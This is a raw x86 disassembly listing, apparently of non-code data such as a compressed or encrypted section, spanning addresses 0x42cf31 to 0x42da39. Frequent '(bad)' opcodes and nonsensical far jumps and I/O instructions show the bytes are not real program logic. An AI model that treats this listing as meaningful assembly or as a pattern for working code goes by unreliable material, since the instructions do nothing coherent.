  42cf31:	(bad)  
  42cf32:	push   ecx
  42cf33:	aam    0x3e
  42cf35:	or     eax,0x314deaa9
  42cf3a:	jne    0x42cfaf
  42cf3c:	xor    BYTE PTR [ecx],0xca
  42cf3f:	rol    BYTE PTR [ebx+0x0],0x0
	...
  42cfb3:	add    BYTE PTR [edx],bh
  42cfb5:	xchg   edx,eax
  42cfb6:	ja     0x42cfea
  42cfb8:	push   edi
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0xc4
  42cfc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cfc2:	test   eax,0x1db815c
  42cfc7:	add    ch,dh
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    BYTE PTR [ecx+ebx*1+0x68],al
  42cfcf:	imul   edx,DWORD PTR [ebx+0x50],0x26
  42cfd3:	mov    bh,0x6b
  42cfd5:	xor    bh,BYTE PTR [ebp-0x76]
  42cfd8:	pop    ecx
  42cfd9:	inc    esi
  42cfda:	sbb    esi,DWORD PTR [edi+0x34]
  42cfdd:	test   al,0xed
  42cfdf:	es lock popa 
  42cfe2:	(bad)  
  42cfe3:	out    0xb8,al
  42cfe5:	jbe    0x42d003
  42cfe7:	leave  
  42cfe8:	jmp    0xad31:0xdece0c8a
  42cfef:	add    ah,bl
  42cff1:	outs   dx,BYTE PTR ds:[esi]
  42cff2:	ja     0x42cffd
  42cff4:	mov    cs,WORD PTR [ebx-0x57a916db]
  42cffa:	sar    BYTE PTR [edi-0x48],0xdf
  42cffe:	and    esi,eax
  42d000:	stos   DWORD PTR es:[edi],eax
  42d001:	inc    ebp
  42d002:	inc    edx
  42d003:	xor    ebx,esi
  42d005:	cdq    
  42d006:	jmp    0x12e7:0x9192fbb
  42d00d:	sti    
  42d00e:	loope  0x42d082
  42d010:	pop    edi
  42d011:	pop    es
  42d012:	(bad)  
  42d013:	je     0x42d087
  42d015:	sbb    dh,BYTE PTR [ecx-0x55]
  42d018:	fild   QWORD PTR [eax]
  42d01a:	jno    0x42d01a
  42d01c:	and    cl,BYTE PTR fs:[eax+0xdffeb22]
  42d023:	dec    ecx
  42d024:	lock repnz iret 
  42d027:	xchg   edi,eax
  42d028:	lods   eax,DWORD PTR ds:[esi]
  42d029:	jle    0x42cfc5
  42d02b:	and    eax,0xdb2b3a7b
  42d030:	stc    
  42d031:	adc    DWORD PTR [esi*8+0x22a94cc6],edi
  42d038:	fucomip st,st(6)
  42d03a:	shr    bh,cl
  42d03c:	add    ebp,ebx
  42d03e:	or     dh,BYTE PTR [esi]
  42d040:	lea    edi,[ebx-0x39f0a12e]
  42d046:	xor    BYTE PTR [eax],0xcf
  42d049:	and    eax,DWORD PTR [ecx]
  42d04b:	mov    ?,WORD PTR [edx+eax*8]
  42d04e:	(bad)  
  42d04f:	mov    ebp,0xf3eaf1ad
  42d054:	imul   eax,DWORD PTR [ebx+ebx*4-0x5e6f99dc],0xa41300c6
  42d05f:	sbb    bl,BYTE PTR [edx+0x1c]
  42d062:	xor    BYTE PTR [ecx],cl
  42d064:	repnz inc edx
  42d066:	dec    edi
  42d067:	aam    0xaf
  42d069:	cmp    edx,ebp
  42d06b:	xor    BYTE PTR [ebx+0x16],al
  42d06e:	mov    BYTE PTR [ebp-0x5a7e3237],bh
  42d074:	push   0x31580b71
  42d079:	sahf   
  42d07a:	dec    ebp
  42d07b:	fst    DWORD PTR [ebx-0x3da9f9]
  42d081:	pop    edi
  42d082:	(bad)  
  42d083:	(bad)  
  42d084:	xor    al,0xf
  42d086:	push   ecx
  42d087:	add    ax,0x874f
  42d08b:	sbb    eax,0x19f2077f
  42d090:	pop    esi
  42d091:	mov    BYTE PTR [ebp+0x28],bh
  42d094:	dec    esp
  42d095:	aaa    
  42d096:	les    ebp,FWORD PTR [eax+eax*4-0x23b1dc5c]
  42d09d:	int3   
  42d09e:	ja     0x42d0ce
  42d0a0:	mov    eax,ds:0xf01bf0e6
  42d0a5:	push   ecx
  42d0a6:	gs enter 0x70b6,0xe7
  42d0ab:	js     0x42d0df
  42d0ad:	fnop   
  42d0af:	jmp    0x42d123
  42d0b1:	fisubr WORD PTR [ecx-0x6]
  42d0b4:	cmp    eax,0x72aee00
  42d0b9:	push   es
  42d0ba:	shl    BYTE PTR [esi],1
  42d0bc:	pop    ds
  42d0bd:	jge    0x42d095
  42d0bf:	xor    al,cl
	...
  42d131:	add    BYTE PTR [eax],al
  42d133:	add    BYTE PTR [ecx-0x7e],ch
  42d136:	int    0xae
  42d138:	out    dx,eax
  42d139:	out    dx,eax
  42d13a:	imul   eax,edi,0x41
  42d13d:	cdq    
  42d13e:	xor    eax,0x9fce0f50
  42d143:	push   ss
  42d144:	jbe    0x42d122
  42d146:	add    DWORD PTR [eax],eax
  42d148:	cmc    
  42d149:	add    BYTE PTR [eax],al
  42d14b:	add    BYTE PTR [ebx-0x60],ah
  42d14e:	cmp    ah,BYTE PTR [ebp+0x51]
  42d151:	push   0x67ff9096
  42d156:	mov    esi,0x3ab6894c
  42d15b:	adc    DWORD PTR [edi],ebx
  42d15d:	add    al,0x47
  42d15f:	mov    eax,ds:0xd516dbbf
  42d164:	jns    0x42d126
  42d166:	xchg   ebx,eax
  42d167:	nop
  42d168:	pop    ecx
  42d169:	sbb    al,0xd3
  42d16b:	adc    ah,BYTE PTR [edi]
  42d16d:	pop    ds
  42d16e:	mov    bh,0x1
  42d170:	mov    eax,fs
  42d172:	ja     0x42d10a
  42d174:	xor    BYTE PTR [edx+0x86dec7b],dh
  42d17a:	or     ebx,DWORD PTR [ebx+eiz*2+0x6bc8aa77]
  42d181:	repnz pop edx
  42d183:	cmp    DWORD PTR [edx],ecx
  42d185:	fisubr WORD PTR [edx+eax*1]
  42d188:	sbb    ebx,ebx
  42d18a:	enter  0x3836,0x31
  42d18e:	adc    DWORD PTR [eax-0x73],edi
  42d191:	jns    0x42d129
  42d193:	mov    es:0xde3c25a9,al
  42d199:	ins    DWORD PTR es:[edi],dx
  42d19a:	fisubr DWORD PTR [ebx]
  42d19c:	loop   0x42d19c
  42d19e:	gs pop es
  42d1a0:	popf   
  42d1a1:	mov    al,ds:0x72425aad
  42d1a6:	push   edx
  42d1a7:	iret   
  42d1a8:	dec    ebx
  42d1a9:	ret    0x93d7
  42d1ac:	cld    
  42d1ad:	sub    al,0x61
  42d1af:	xchg   edi,eax
  42d1b0:	xchg   ebx,eax
  42d1b1:	sub    ebx,ecx
  42d1b3:	and    bh,cl
  42d1b5:	out    dx,al
  42d1b6:	idiv   BYTE PTR [ebx+ebx*1-0x61de78fa]
  42d1bd:	adc    BYTE PTR [edx-0x1ecc218f],bh
  42d1c3:	call   0x4b7f8a10
  42d1c8:	jl     0x42d1d9
  42d1ca:	add    edi,DWORD PTR [ebx+0x2b]
  42d1cd:	sub    eax,0xc45917b4
  42d1d2:	sbb    BYTE PTR [edi],dh
  42d1d4:	fs push 0x2bad267f
  42d1da:	retf   0x22f6
  42d1dd:	(bad)  
  42d1de:	ja     0x42d22d
  42d1e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1e1:	les    ebx,FWORD PTR [edi+0x7937027]
  42d1e7:	mov    ebx,0xf340ec0f
  42d1ec:	sub    ecx,eax
  42d1ee:	sub    BYTE PTR [ebx+0x535774b5],ah
  42d1f4:	data16 into 
  42d1f6:	mov    ch,BYTE PTR [ebx]
  42d1f8:	fwait
  42d1f9:	mov    DWORD PTR [ebx],esp
  42d1fb:	add    BYTE PTR [ebp+edi*4+0x7c],cl
  42d1ff:	push   ds
  42d200:	js     0x42d1c9
  42d202:	mov    ds:0x86c28204,eax
  42d207:	mov    dh,0x95
  42d209:	jmp    0x4420:0xcde5955c
  42d210:	je     0x42d1bb
  42d212:	add    ecx,DWORD PTR ds:0xfd2f4606
  42d218:	fcmovnu st,st(7)
  42d21a:	fidiv  DWORD PTR [edi-0x7cd40073]
  42d220:	idiv   al
  42d222:	inc    eax
  42d223:	jle    0x42d253
  42d225:	and    ecx,DWORD PTR [edx+0x2b]
  42d228:	jle    0x42d1e9
  42d22a:	jno    0x42d1d7
  42d22c:	retf   0x57c0
  42d22f:	cmp    BYTE PTR [eax-0x5d],0x54
  42d233:	inc    edi
  42d234:	fwait
  42d235:	push   ecx
  42d236:	mov    edx,0xd5d6cdc6
  42d23b:	xor    BYTE PTR [edi-0x24046cd],0x0
	...
  42d2b2:	add    BYTE PTR [eax],al
  42d2b4:	out    0xf,al
  42d2b6:	fldcw  WORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	sbb    DWORD PTR [ebp+0x2f],edx
  42d2c3:	or     eax,0x1dd6b
  42d2c8:	cmc    
  42d2c9:	add    BYTE PTR [eax],al
  42d2cb:	add    BYTE PTR [esp+eax*2-0x3516fe3c],bh
  42d2d2:	divps  xmm0,XMMWORD PTR [ebp-0x603df45d]
  42d2d9:	(bad)  
  42d2da:	fnstcw WORD PTR [edx+0x3e]
  42d2dd:	mov    edi,0x3ce34c4a
  42d2e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2e3:	dec    ebp
  42d2e4:	pop    esp
  42d2e5:	(bad)  
  42d2e6:	clc    
  42d2e7:	jae    0x42d32d
  42d2e9:	add    eax,0xe1c0952d
  42d2ee:	cmp    DWORD PTR [eax+0x71],ebx
  42d2f1:	mov    WORD PTR [esi+ebp*1-0x24],cs
  42d2f5:	sar    ebp,1
  42d2f7:	retf   0x5a9
  42d2fa:	cmp    al,BYTE PTR [eax]
  42d2fc:	(bad)  
  42d2fe:	inc    eax
  42d2ff:	mov    ah,0x3
  42d301:	test   eax,0xf9b5d037
  42d306:	jle    0x42d368
  42d308:	lock mov DWORD PTR [ebx+0x2c838cf6],ebp
  42d30f:	xchg   BYTE PTR [ebx-0x203b88c4],dl
  42d315:	out    dx,eax
  42d316:	pop    esp
  42d317:	clc    
  42d318:	or     eax,0x6cb76e94
  42d31d:	xchg   DWORD PTR [ecx],ecx
  42d31f:	stos   BYTE PTR es:[edi],al
  42d320:	mov    ch,0xa3
  42d322:	ret    
  42d323:	(bad)  
  42d324:	push   ecx
  42d325:	and    al,bh
  42d327:	es xchg edi,eax
  42d329:	stc    
  42d32a:	stos   DWORD PTR es:[edi],eax
  42d32b:	jp     0x42d383
  42d32d:	test   BYTE PTR [ebp+0x3d],0x9d
  42d331:	dec    edx
  42d332:	and    cl,ah
  42d334:	es (bad) 
  42d336:	sub    DWORD PTR [ebx],ebp
  42d338:	dec    ecx
  42d339:	and    al,0x97
  42d33b:	inc    eax
  42d33c:	push   eax
  42d33d:	dec    eax
  42d33e:	imul   cl
  42d340:	xchg   BYTE PTR [ebx+0x4db63b13],bh
  42d346:	jne    0x42d3c1
  42d348:	or     eax,0xf6560622
  42d34d:	cmp    eax,0x7e76dd30
  42d352:	inc    edi
  42d353:	daa    
  42d354:	jge    0x42d2da
  42d356:	push   edi
  42d357:	mov    ecx,0xe98b6b27
  42d35c:	nop
  42d35d:	test   eax,0x2f0e89fa
  42d362:	dec    ecx
  42d363:	scas   al,BYTE PTR es:[edi]
  42d364:	out    dx,al
  42d365:	sti    
  42d366:	jae    0x42d3bb
  42d368:	pop    ss
  42d369:	jle    0x42d332
  42d36b:	cs in  eax,0x99
  42d36e:	shl    BYTE PTR [ebx+0x4bfd5830],1
  42d374:	dec    eax
  42d375:	ror    BYTE PTR [ebx+0x6b2638b2],0xf1
  42d37c:	sbb    al,0xcf
  42d37e:	mov    al,ds:0x381f8d83
  42d383:	add    esp,ebx
  42d385:	sbb    bh,dh
  42d387:	or     BYTE PTR [esi],bl
  42d389:	stc    
  42d38a:	add    cl,dl
  42d38c:	dec    edi
  42d38d:	scas   al,BYTE PTR es:[edi]
  42d38e:	dec    esi
  42d38f:	pop    ds
  42d390:	cs jo  0x42d3c7
  42d393:	test   dl,dh
  42d395:	aas    
  42d396:	out    dx,al
  42d397:	hlt    
  42d398:	xlat   BYTE PTR ds:[ebx]
  42d399:	aaa    
  42d39a:	xor    al,0xaf
  42d39d:	ins    DWORD PTR es:[edi],dx
  42d39e:	adc    al,0xd0
  42d3a0:	or     eax,0x6b0e0539
  42d3a5:	jno    0x42d33b
  42d3a7:	adc    al,0x72
  42d3a9:	(bad)  
  42d3aa:	mov    eax,ds:0x18f75174
  42d3af:	icebp  
  42d3b0:	or     eax,0xc026adad
  42d3b5:	lods   eax,DWORD PTR ds:[esi]
  42d3b6:	sub    al,0x6d
  42d3b8:	test   cl,bh
  42d3ba:	sub    al,0x9c
  42d3bc:	adc    BYTE PTR ds:0x1fadbf,bl
	...
  42d432:	add    BYTE PTR [eax],al
  42d434:	in     al,dx
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0x9c730781
  42d442:	sbb    BYTE PTR [eax+eiz*2-0xafffe22],ch
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    BYTE PTR [edi+ebx*2],ch
  42d44e:	pop    ss
  42d44f:	jmp    0x21214d98
  42d454:	xor    ecx,edx
  42d456:	push   edx
  42d457:	popa   
  42d458:	jmp    0x42d449
  42d45a:	mov    ds:0xa0a39e58,al
  42d45f:	outs   dx,DWORD PTR ds:[esi]
  42d460:	scas   eax,DWORD PTR es:[edi]
  42d461:	cmp    al,0x7c
  42d463:	call   0xb0c7f299
  42d468:	lahf   
  42d469:	ja     0x42d4e0
  42d46b:	xchg   esp,eax
  42d46c:	sbb    esp,DWORD PTR [ebx+0xe]
  42d46f:	clc    
  42d470:	scas   eax,DWORD PTR es:[edi]
  42d471:	inc    eax
  42d472:	das    
  42d473:	lods   eax,DWORD PTR ds:[esi]
  42d474:	lahf   
  42d475:	test   BYTE PTR [eax+0x468248bf],dh
  42d47b:	jmp    0x42d4fc
  42d47d:	push   ss
  42d47e:	push   ebx
  42d47f:	repnz gs cld 
  42d482:	add    bl,dh
  42d484:	lods   eax,DWORD PTR ds:[esi]
  42d485:	dec    esi
  42d486:	mov    ds:0x160a0c44,eax
  42d48b:	fcom   DWORD PTR [edi+0x3dfed16]
  42d491:	sbb    eax,0xf6e10d64
  42d496:	dec    edx
  42d497:	adc    DWORD PTR [eax],0x69108277
  42d49d:	lea    esi,[edx-0x4ea09af9]
  42d4a3:	push   ecx
  42d4a4:	pushf  
  42d4a5:	out    dx,eax
  42d4a6:	retf   
  42d4a7:	mov    bh,0x88
  42d4a9:	push   ss
  42d4aa:	enter  0x6074,0x7a
  42d4ae:	mov    ebp,0xd57a707a
  42d4b3:	popa   
  42d4b4:	mov    ecx,0x3074fec
  42d4b9:	xchg   edi,eax
  42d4ba:	test   al,0x9b
  42d4bc:	push   eax
  42d4bd:	sbb    esp,DWORD PTR [ebx-0x4600a826]
  42d4c3:	arpl   dx,ax
  42d4c5:	and    DWORD PTR [esi+edi*2-0x5b],0xd151b5bf
  42d4cd:	cmc    
  42d4ce:	add    al,0xd7
  42d4d0:	in     eax,0x77
  42d4d2:	shl    DWORD PTR [edx-0x4d34c1a6],0x3f
  42d4d9:	and    DWORD PTR [edx],eax
  42d4db:	imul   esi,DWORD PTR ds:0x2f219af8,0x14a6e5f1
  42d4e5:	out    dx,al
  42d4e6:	gs cwde 
  42d4e8:	mov    ch,BYTE PTR [edi-0x6b]
  42d4eb:	aaa    
  42d4ec:	frstor [ebp-0x6627d960]
  42d4f2:	dec    ebp
  42d4f3:	adc    al,0x2f
  42d4f5:	jmp    0xdced:0x8e08fe33
  42d4fc:	sub    al,0xb3
  42d4fe:	add    DWORD PTR [esi],ebp
  42d500:	popa   
  42d501:	ss push ecx
  42d503:	outs   dx,BYTE PTR ds:[esi]
  42d504:	sub    esi,DWORD PTR [eax+ebp*2+0x33c037bd]
  42d50b:	js     0x42d4b4
  42d50d:	iret   
  42d50e:	loopne 0x42d521
  42d510:	add    eax,0x44cfe259
  42d515:	ret    0x941
  42d518:	imul   DWORD PTR [edx]
  42d51a:	adc    BYTE PTR [edx-0x44def385],ch
  42d520:	je     0x42d507
  42d522:	inc    esp
  42d523:	(bad)  
  42d524:	shr    al,1
  42d526:	sbb    BYTE PTR [ecx+eax*2],dh
  42d529:	fwait
  42d52a:	into   
  42d52b:	inc    DWORD PTR es:[esi]
  42d52e:	mov    ebp,0xb430397c
  42d533:	test   DWORD PTR [ebx],esp
  42d535:	mov    bh,0xeb
  42d537:	add    DWORD PTR ds:0x82278f30,ebp
  42d53d:	pop    ds
  42d53e:	(bad)  
  42d53f:	and    al,0x29
	...
  42d5b1:	add    BYTE PTR [eax],al
  42d5b3:	add    BYTE PTR [ebp+0x48],bl
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	sbb    DWORD PTR [edx],ecx
  42d5c2:	mov    eax,0x1df552b
  42d5c7:	add    ch,dh
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    BYTE PTR [esi-0x3221dd97],ah
  42d5d1:	mov    eax,ds:0x63c8cb29
  42d5d6:	mov    cl,0x42
  42d5d8:	mov    dh,0xe9
  42d5da:	fcmove st,st(5)
  42d5dc:	push   ebp
  42d5dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5de:	(bad)  
  42d5df:	mov    al,0x1d
  42d5e1:	cdq    
  42d5e2:	xor    DWORD PTR [esi+0x6998b273],0xb8469638
  42d5ec:	dec    esi
  42d5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5ee:	pop    edi
  42d5ef:	test   BYTE PTR [edx-0x51195bbb],bl
  42d5f5:	mov    edx,0xcb0576fb
  42d5fa:	push   ds
  42d5fb:	adc    DWORD PTR [esp+esi*8-0x59],edi
  42d5ff:	or     ebx,ebx
  42d601:	gs jp  0x42d635
  42d604:	mov    al,BYTE PTR [edx-0x30]
  42d607:	mov    ch,0xb7
  42d609:	inc    eax
  42d60a:	mov    ecx,0xd128338e
  42d60f:	sbb    ebx,esi
  42d611:	or     eax,0x6480206f
  42d616:	xlat   BYTE PTR ds:[ebx]
  42d617:	div    ecx
  42d619:	in     eax,dx
  42d61a:	imul   eax,DWORD PTR [ebx-0x6a],0xffffffa4
  42d61e:	sbb    edx,DWORD PTR [edx+0x58]
  42d621:	repnz loope 0x42d695
  42d624:	jno    0x42d670
  42d626:	jno    0x42d64b
  42d628:	outs   dx,DWORD PTR ds:[esi]
  42d629:	xchg   ecx,eax
  42d62a:	out    dx,al
  42d62b:	(bad)  
  42d62c:	je     0x42d67f
  42d62e:	out    dx,eax
  42d62f:	sub    edx,esi
  42d631:	repz popf 
  42d633:	pop    ecx
  42d634:	stc    
  42d635:	in     eax,0x53
  42d637:	daa    
  42d638:	jle    0x42d657
  42d63a:	in     eax,dx
  42d63b:	inc    eax
  42d63c:	popa   
  42d63d:	adc    eax,0x3a9366d5
  42d642:	ss test eax,0x9aa1b3f0
  42d648:	sub    eax,0x9cfb93fc
  42d64d:	outs   dx,DWORD PTR ds:[esi]
  42d64e:	cmp    al,0xa3
  42d650:	stc    
  42d651:	and    ebp,edi
  42d653:	ds sub dh,ch
  42d656:	xchg   ebp,eax
  42d657:	leave  
  42d658:	rcl    BYTE PTR [ebx+eiz*1+0x3f947eec],0x22
  42d660:	dec    edi
  42d661:	jmp    0x916f0587
  42d666:	cmp    eax,edi
  42d668:	stos   DWORD PTR es:[edi],eax
  42d669:	jns    0x42d5f7
  42d66b:	fcomip st,st(3)
  42d66d:	lds    esp,FWORD PTR [edi-0x20]
  42d670:	int    0x12
  42d672:	mov    ds:0x4bdc85a6,eax
  42d677:	or     ebp,edx
  42d679:	dec    DWORD PTR [esp+ebp*1]
  42d67c:	imul   edi,DWORD PTR [esi+0x6995b177],0xffffffa7
  42d683:	mov    bl,0xb8
  42d685:	out    dx,eax
  42d686:	into   
  42d687:	lods   al,BYTE PTR ds:[esi]
  42d688:	rcr    BYTE PTR [ecx-0x3695078],cl
  42d68e:	push   cs
  42d68f:	adc    al,0x3a
  42d691:	add    dl,BYTE PTR [edi]
  42d693:	icebp  
  42d694:	sub    eax,0xb0e6be98
  42d699:	es iret 
  42d69b:	sub    DWORD PTR ds:0xe8c2f6c2,ecx
  42d6a1:	xchg   ecx,eax
  42d6a2:	mov    edx,0x53139c57
  42d6a7:	inc    ebx
  42d6a8:	leave  
  42d6a9:	mov    edi,0xf68e1d4b
  42d6ae:	cli    
  42d6af:	mov    WORD PTR [ecx-0x6ee09b57],gs
  42d6b5:	je     0x42d6fd
  42d6b7:	call   0x88e62004
  42d6bc:	ss jns 0x42d6dd
  42d6bf:	add    eax,0x2a
	...
  42d734:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42d73a:	jmp    FWORD PTR [ebp-0x78eb318b]
  42d740:	out    dx,al
  42d741:	fdiv   DWORD PTR [edx]
  42d743:	dec    edi
  42d744:	dec    edx
  42d745:	loopne 0x42d748
  42d747:	add    ch,dh
  42d749:	add    BYTE PTR [eax],al
  42d74b:	add    BYTE PTR [esi],bl
  42d74d:	gs pop edx
  42d74f:	movsx  esi,WORD PTR [edx+0x208f1719]
  42d756:	pop    ecx
  42d757:	push   esi
  42d758:	push   edx
  42d759:	into   
  42d75a:	sbb    dl,BYTE PTR [edx]
  42d75c:	sahf   
  42d75d:	mov    ah,0x41
  42d75f:	and    edi,DWORD PTR [ebp-0x2e30c35d]
  42d765:	ret    0x3bc3
  42d768:	sbb    eax,0x46150bd4
  42d76d:	lock rol DWORD PTR [edx+0xe],cl
  42d771:	pushf  
  42d772:	mov    eax,0xc2e283cd
  42d777:	or     DWORD PTR [ebp+0x4538a721],esp
  42d77d:	inc    ebp
  42d77e:	inc    ebx
  42d77f:	mov    al,0x40
  42d781:	aaa    
  42d782:	popf   
  42d783:	sbb    DWORD PTR [eax-0x2919bcff],edi
  42d789:	imul   edx,edi,0xffffffab
  42d78c:	push   eax
  42d78d:	test   cl,dh
  42d78f:	stc    
  42d790:	arpl   WORD PTR [edi],dx
  42d792:	sub    eax,0x71772119
  42d797:	in     eax,dx
  42d798:	mov    BYTE PTR [edx+0x1f],bl
  42d79b:	pop    eax
  42d79c:	mov    esi,es
  42d79e:	dec    ebx
  42d79f:	mov    ebx,0x52e8fb5f
  42d7a4:	inc    edx
  42d7a5:	add    DWORD PTR [edi],ebx
  42d7a7:	jne    0x42d78c
  42d7a9:	push   0x79
  42d7ab:	xchg   ebp,eax
  42d7ac:	cmp    al,0xdb
  42d7ae:	pop    ds
  42d7af:	ja     0x42d745
  42d7b1:	dec    DWORD PTR [ebx]
  42d7b3:	sub    eax,0xb1285af3
  42d7b8:	ss mov ah,0x67
  42d7bb:	into   
  42d7bc:	inc    esp
  42d7bd:	sbb    eax,0xfb084d59
  42d7c2:	jbe    0x42d768
  42d7c4:	es push esp
  42d7c6:	cmp    ebx,ebp
  42d7c8:	sub    DWORD PTR [ecx],esp
  42d7ca:	ret    0xa0e1
  42d7cd:	mov    eax,0x3aac7ae8
  42d7d2:	mov    ecx,DWORD PTR [esi-0x3e]
  42d7d5:	mov    ds:0x664dfc73,al
  42d7da:	loope  0x42d790
  42d7dc:	pop    ds
  42d7dd:	cmp    bh,BYTE PTR [ecx+0x306144a3]
  42d7e3:	mov    bl,0x50
  42d7e5:	aaa    
  42d7e6:	shr    DWORD PTR [ecx+ebp*4-0x69],1
  42d7ea:	push   ss
  42d7eb:	loop   0x42d78d
  42d7ed:	mov    esi,0xf149a458
  42d7f2:	sysexit 
  42d7f4:	and    al,0x3f
  42d7f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7f7:	mov    edi,0xfed5b5c9
  42d7fc:	push   ecx
  42d7fd:	add    ebx,DWORD PTR [ebx]
  42d7ff:	push   edi
  42d800:	or     DWORD PTR [eax],edx
  42d802:	sbb    BYTE PTR [eax-0x538395fb],0xf9
  42d809:	ins    BYTE PTR es:[edi],dx
  42d80a:	popa   
  42d80b:	out    dx,eax
  42d80c:	pop    edi
  42d80d:	inc    eax
  42d80e:	xchg   BYTE PTR [ebx+0x1782b8d1],al
  42d814:	inc    edx
  42d815:	mov    ah,0x4c
  42d817:	test   eax,0x25eba38b
  42d81c:	out    dx,al
  42d81d:	imul   edi,DWORD PTR [esi],0x50
  42d820:	into   
  42d821:	jns    0x42d879
  42d823:	cld    
  42d824:	adc    eax,0x1d7fed7d
  42d829:	pop    eax
  42d82a:	in     al,0x4e
  42d82c:	dec    edi
  42d82d:	and    bl,cl
  42d82f:	mov    cl,0xc8
  42d831:	bound  edx,QWORD PTR [edi]
  42d833:	fwait
  42d834:	mov    bh,0x2d
  42d836:	loopne 0x42d7c6
  42d838:	outs   dx,BYTE PTR ds:[esi]
  42d839:	in     eax,0x66
  42d83b:	cmp    ecx,ebx
  42d83d:	sub    eax,0x25a080
	...
  42d8b2:	add    BYTE PTR [eax],al
  42d8b4:	adc    BYTE PTR [ebx],bl
  42d8b6:	leave  
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0x94dcc254
  42d8c1:	mov    bh,0xc7
  42d8c3:	push   esp
  42d8c4:	aas    
  42d8c5:	loope  0x42d8c8
  42d8c7:	add    ch,dh
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    BYTE PTR [esi+0x11],cl
  42d8ce:	sbb    ah,BYTE PTR [esi-0x1c]
  42d8d1:	jge    0x42d8ab
  42d8d3:	dec    eax
  42d8d4:	push   ds
  42d8d5:	dec    ebp
  42d8d6:	outs   dx,DWORD PTR ds:[esi]
  42d8d7:	push   0x4f
  42d8d9:	mov    bl,ch
  42d8db:	push   0xb96284f
  42d8e0:	dec    edx
  42d8e1:	popa   
  42d8e2:	sbb    BYTE PTR [edx+0x5609404d],0x5d
  42d8e9:	scas   eax,DWORD PTR es:[edi]
  42d8ea:	inc    ecx
  42d8eb:	adc    al,0x13
  42d8ed:	repnz or BYTE PTR [ecx+0x62],0xe9
  42d8f2:	stc    
  42d8f3:	hlt    
  42d8f4:	push   cs
  42d8f5:	add    DWORD PTR [edi+0x3f9c171a],edi
  42d8fb:	fstp   QWORD PTR [eax]
  42d8fd:	mov    BYTE PTR [eax+0x1b],ah
  42d900:	push   ds
  42d901:	nop
  42d902:	lods   al,BYTE PTR ds:[esi]
  42d903:	and    ah,dh
  42d905:	dec    edi
  42d906:	ja     0x42d918
  42d908:	scas   al,BYTE PTR es:[edi]
  42d909:	push   ss
  42d90a:	hlt    
  42d90b:	add    al,0xce
  42d90d:	xlat   BYTE PTR ds:[ebx]
  42d90e:	aad    0xa
  42d910:	push   esp
  42d911:	scas   al,BYTE PTR es:[edi]
  42d912:	outs   dx,DWORD PTR ds:[esi]
  42d913:	mov    bl,0xca
  42d915:	sti    
  42d916:	and    bl,BYTE PTR [ebx]
  42d918:	jae    0x42d942
  42d91a:	les    esp,FWORD PTR [edi-0x31112f8a]
  42d920:	sub    ecx,edi
  42d922:	imul   eax,DWORD PTR [eax],0x85e1fa77
  42d928:	je     0x42d8c7
  42d92a:	bound  esi,QWORD PTR ds:0x799b9855
  42d930:	mov    esp,DWORD PTR [ebx-0x55]
  42d933:	hlt    
  42d934:	sbb    eax,ecx
  42d936:	mov    DWORD PTR [ecx-0x6f9a4368],edi
  42d93c:	xor    BYTE PTR [edi+0x2a975278],al
  42d942:	clc    
  42d943:	test   al,0x78
  42d945:	sub    eax,0x77ddfe96
  42d94a:	mul    BYTE PTR [edx+esi*2-0x5b4dc938]
  42d951:	mov    bh,0x22
  42d953:	or     BYTE PTR [edi],ch
  42d955:	push   edx
  42d956:	outs   dx,BYTE PTR ds:[esi]
  42d957:	ja     0x42d91f
  42d959:	jge    0x42d9a6
  42d95b:	xchg   ecx,eax
  42d95d:	sahf   
  42d95e:	arpl   WORD PTR [esi-0x480016a8],bp
  42d964:	jae    0x42d8f7
  42d966:	stos   BYTE PTR es:[edi],al
  42d967:	addr16 pop ss
  42d969:	(bad)  
  42d96a:	and    al,0x99
  42d96c:	test   dl,ch
  42d96e:	fcomp  st(5)
  42d971:	push   ds
  42d972:	or     BYTE PTR [ecx+0x7393ddd7],cl
  42d978:	and    edx,DWORD PTR [edi+0x4e]
  42d97b:	or     eax,0x3fb25245
  42d980:	sub    eax,ebp
  42d982:	mov    edi,0xe97106f
  42d987:	jmp    0xdb2b6685
  42d98c:	cli    
  42d98d:	imul   edx,DWORD PTR [edx-0x4d0064a8],0x69
  42d994:	add    eax,0xadf88493
  42d999:	mov    cl,0x4b
  42d99b:	jbe    0x42d9ca
  42d99d:	xor    al,0x73
  42d99f:	dec    ebx
  42d9a0:	in     eax,0xc8
  42d9a2:	into   
  42d9a3:	ins    BYTE PTR es:[edi],dx
  42d9a4:	fld    TBYTE PTR [ebx]
  42d9a6:	xchg   edx,eax
  42d9a7:	inc    ebp
  42d9a8:	in     al,0x23
  42d9aa:	or     dl,BYTE PTR [esp+edi*4]
  42d9ad:	pop    edx
  42d9ae:	daa    
  42d9af:	jbe    0x42d959
  42d9b1:	adc    eax,0x6f99d3bc
  42d9b6:	pop    es
  42d9b7:	ficomp WORD PTR [ecx+ebp*2-0x4b]
  42d9bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d9bc:	mov    ebp,DWORD PTR [ecx]
  42d9be:	scas   al,BYTE PTR es:[edi]
  42d9bf:	lea    esi,[ecx+0x0]
	...
  42da31:	add    BYTE PTR [eax],al
  42da33:	add    BYTE PTR [edi-0x2be7726],ah
  42da39:	push   ebx
